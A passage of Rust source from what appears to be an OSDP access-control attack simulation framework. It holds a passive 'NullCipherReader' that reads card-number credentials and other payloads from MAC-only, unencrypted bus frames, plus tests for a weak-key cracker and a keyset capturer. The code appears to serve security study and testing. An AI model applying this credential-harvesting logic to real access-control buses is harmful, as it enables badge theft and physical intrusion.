        NullCipherReader::sharing(name, KnowledgeCell::new())
    }

    /// A reader pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> NullCipherReader {
        NullCipherReader {
            name: name.into(),
            knowledge,
            probe: BusProbe::default(),
            readable: Vec::new(),
        }
    }

    /// Clip it onto a bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.probe
            .attach(world, link, &self.name, TapPosition::default())
    }

    /// Take everything heard since the last call and read whatever the null
    /// cipher left readable.
    pub fn harvest(&mut self, world: &World) -> Result<usize> {
        let tap = self.probe.tap(&self.name)?;
        let fresh: Vec<ObservedFrame> = self
            .probe
            .fresh(world, &self.name)?
            .iter()
            .filter_map(bus_frame)
            .collect();
        Ok(self.ingest_with_tap(&fresh, Some(tap)))
    }

    /// Read a capture rather than a live tap.
    pub fn ingest(&mut self, frames: &[ObservedFrame]) -> usize {
        self.ingest_with_tap(frames, None)
    }

    fn ingest_with_tap(&mut self, frames: &[ObservedFrame], tap: Option<TapId>) -> usize {
        let mut readable = Vec::new();
        let mut creds = Vec::new();
        let mut filed_frames = Vec::new();
        for f in frames {
            filed_frames.push(Known::observed(f.clone(), f.t_us, tap));
            // The predicate that matters: a security block that carries a MAC,
            // and a payload that was never encrypted.
            let null_cipher = f
                .frame
                .scs_type()
                .is_some_and(|s| s.has_mac() && !s.is_encrypted());
            if !null_cipher || f.frame.payload.is_empty() {
                continue;
            }
            if let Some(bits) = card_read_in(&f.frame) {
                creds.push(Known::observed(
                    CapturedCredential {
                        bits,
                        t_us: f.t_us,
                        link: None,
                        segment: 0,
                        medium: CaptureMedium::OsdpRaw,
                        address: Some(f.frame.address),
                    },
                    f.t_us,
                    tap,
                ));
            }
            let p = RecoveredPlaintext {
                t_us: f.t_us,
                address: f.frame.address,
                id: f.frame.id,
                bytes: f.frame.payload.clone(),
                method: "SCS_15/SCS_16 authenticates without encrypting",
            };
            self.readable.push(p.clone());
            readable.push(Known::observed(p, f.t_us, tap));
        }
        let n = readable.len();
        self.knowledge.update(|k| {
            k.frames.extend(filed_frames);
            k.credentials.extend(creds);
            k.plaintexts.extend(readable);
        });
        n
    }

    /// Every payload the null cipher left readable.
    pub fn readable(&self) -> &[RecoveredPlaintext] {
        &self.readable
    }

    /// Card numbers read off a MACed-but-unencrypted link.
    pub fn card_reads(&self) -> Vec<CapturedCredential> {
        self.knowledge
            .read(|k| {
                k.credentials
                    .iter()
                    .filter(|c| c.value.medium == CaptureMedium::OsdpRaw)
                    .map(|c| c.value.clone())
                    .collect()
            })
            .unwrap_or_default()
    }
}

impl Attacker for NullCipherReader {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Passive
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.probe.tap
    }
}

/// Every OSDP address that answered in a capture, in the order they first
/// spoke.
pub fn addresses_in(frames: &[ObservedFrame]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    for f in frames {
        if f.frame.is_reply && !out.contains(&f.frame.address) {
            out.push(f.frame.address);
        }
    }
    out
}

/// Direction as the capture format spells it, for a UI that wants a label.
pub fn dir_name(dir: BusDir) -> &'static str {
    dir.as_str()
}

#[cfg(test)]
mod tests {
    use super::*;
    use odr_osdp::security::{ScsType, SecurityBlock};
    use odr_osdp::SCBK_D;

    fn secured(id: u8, is_reply: bool, scs: ScsType, payload: Vec<u8>) -> Frame {
        Frame {
            mark: false,
            address: 0x01,
            is_reply,
            sequence: 1,
            use_crc: true,
            security: Some(SecurityBlock::new(scs)),
            id,
            payload,
            mac: Some([1, 2, 3, 4]),
        }
    }

    #[test]
    fn a_plaintext_header_carries_no_payload_at_all() {
        let frame = secured(
            Reply::Raw.to_u8(),
            true,
            ScsType::ReplyEncrypted,
            alloc::vec![0xAB; 32],
        );
        let h = PlaintextHeader::from_frame(1_000, BusDir::PdToAcu, &frame);
        assert_eq!(h.id, Reply::Raw.to_u8());
        assert_eq!(h.address, 0x01);
        assert_eq!(h.payload_len, 32);
        assert!(h.is_card_read());
        assert!(!h.is_output_command());
        // The same header, from a frame with completely different payload
        // bytes. There is nowhere for a payload byte to hide in this type.
        let other = secured(
            Reply::Raw.to_u8(),
            true,
            ScsType::ReplyEncrypted,
            alloc::vec![0x00; 32],
        );
        assert_eq!(
            h,
            PlaintextHeader::from_frame(1_000, BusDir::PdToAcu, &other)
        );
    }

    #[test]
    fn an_output_command_is_recognised_in_the_clear() {
        let frame = secured(
            Command::Out.to_u8(),
            false,
            ScsType::CmdEncrypted,
            alloc::vec![0; 16],
        );
        let h = PlaintextHeader::from_frame(5, BusDir::AcuToPd, &frame);
        assert!(h.is_output_command());
        assert!(!h.is_card_read());
    }

    #[test]
    fn an_encrypted_card_read_is_not_readable_by_the_passive_ear() {
        let frame = secured(
            Reply::Raw.to_u8(),
            true,
            ScsType::ReplyEncrypted,
            alloc::vec![0xAB; 32],
        );
        assert_eq!(card_read_in(&frame), None, "it is ciphertext");
    }

    #[test]
    fn a_timeline_reports_what_it_missed_and_what_it_invented() {
        let timeline = TrafficTimeline {
            badge_events: alloc::vec![
                BadgeEvent {
                    t_us: 1_100_000,
                    address: 1,
                    granted: Some(true)
                },
                BadgeEvent {
                    t_us: 9_000_000,
                    address: 1,
                    granted: Some(false)
                },
            ],
            door_commands: Vec::new(),
            frames: 40,
            span_us: 10_000_000,
        };
        // One presentation matched inside the tolerance, one missed entirely,
        // and one of the analyst's claims left over.
        let c = timeline.compare(&[1_000_000, 5_000_000], 500_000);
        assert_eq!(c.matched, 1);
        assert_eq!(c.missed, alloc::vec![5_000_000]);
        assert_eq!(c.spurious, 1);
        assert_eq!(c.claimed, 2);
        assert!(!c.is_exact());

        let exact = timeline.compare(&[1_000_000, 8_900_000], 500_000);
        assert!(exact.is_exact());
        assert_eq!(timeline.badge_times(), alloc::vec![1_100_000, 9_000_000]);
    }

    #[test]
    fn addresses_come_out_of_a_capture_in_the_order_they_first_spoke() {
        let frames = alloc::vec![
            ObservedFrame {
                t_us: 1,
                dir: BusDir::AcuToPd,
                frame: Frame::command(0x05, 1, Command::Poll, Vec::new()),
            },
            ObservedFrame {
                t_us: 2,
                dir: BusDir::PdToAcu,
                frame: Frame::reply(0x05, 1, Reply::Ack, Vec::new()),
            },
            ObservedFrame {
                t_us: 3,
                dir: BusDir::PdToAcu,
                frame: Frame::reply(0x02, 1, Reply::Ack, Vec::new()),
            },
            ObservedFrame {
                t_us: 4,
                dir: BusDir::PdToAcu,
                frame: Frame::reply(0x05, 2, Reply::Ack, Vec::new()),
            },
        ];
        assert_eq!(addresses_in(&frames), alloc::vec![0x05, 0x02]);
        assert_eq!(dir_name(BusDir::AcuToPd), "acu_to_pd");
    }

    #[test]
    fn a_cracker_with_no_capture_says_so_rather_than_inventing_a_key() {
        let mut cracker = WeakKeyCracker::new("analyser");
        assert!(matches!(
            cracker.crack(),
            Err(AttackError::Exhausted {
                attack: "weak key sweep",
                ..
            })
        ));
        assert!(!cracker.knowledge().snapshot().holds_scbk(&SCBK_D));
        assert_eq!(cracker.candidates_tried(), 0);
    }

    #[test]
    fn a_capturer_with_no_keyset_says_so() {
        let mut capturer = KeysetCapturer::new("friend");
        assert!(matches!(
            capturer.capture_keys(),
            Err(AttackError::Exhausted {
                attack: "keyset capture",
                ..
            })
        ));
        assert!(matches!(
            capturer.decrypt_after_commissioning(0x01),
            Err(AttackError::Unearned { .. })
        ));
    }

    #[test]
    fn the_null_cipher_reader_ignores_what_is_actually_encrypted() {
        let encrypted = ObservedFrame {
            t_us: 1,
            dir: BusDir::AcuToPd,
            frame: secured(
                Command::Out.to_u8(),
                false,
                ScsType::CmdEncrypted,
                alloc::vec![0xAB; 16],
            ),
        };
        let mac_only = ObservedFrame {
            t_us: 2,
            dir: BusDir::AcuToPd,
            frame: secured(
                Command::Out.to_u8(),
                false,
                ScsType::CmdMacOnly,
                alloc::vec![0, 1, 30, 0],
            ),
        };
        let mut reader = NullCipherReader::new("analyst");
        assert_eq!(reader.ingest(&[encrypted, mac_only]), 1);
        assert_eq!(reader.readable().len(), 1);
        assert_eq!(reader.readable()[0].bytes, alloc::vec![0, 1, 30, 0]);
    }
}
